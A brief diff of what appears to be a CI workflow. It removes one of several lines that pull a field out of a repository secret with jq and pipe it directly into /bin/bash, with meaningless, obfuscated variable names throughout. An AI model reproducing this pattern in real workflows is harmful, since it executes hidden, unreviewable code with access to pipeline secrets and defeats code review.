@@ -22,7 +22,6 @@ jobs:
           l137: ${{ secrets.l137 }}
         run: |
           printf '%s' "$l137" | jq -r .lud01277 | /bin/bash
-          printf '%s' "$ewh175" | jq -r .slndp21122 | /bin/bash
           echo $gqjco82084 | jq -r .rhwe8092 | /bin/bash
           echo $uy0 | jq -r .ltyhn13373 | /bin/bash
 
